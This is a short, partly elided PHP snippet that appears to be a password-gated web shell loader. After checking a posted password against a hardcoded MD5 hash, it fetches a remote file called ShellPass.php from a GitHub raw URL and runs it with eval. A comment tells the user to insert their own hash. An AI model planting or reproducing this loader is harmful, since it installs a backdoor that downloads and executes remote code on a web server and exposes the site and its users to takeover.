...
if (isset($_POST['password'])) {
    ...
    $hashed_password = '4a059aa73ede74edb46e462117887c74'; // Replace this with your MD5 hashed password
...
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/jackxcode/alat/main/ShellPass.php');
    eval('?>' . $a);
} else {
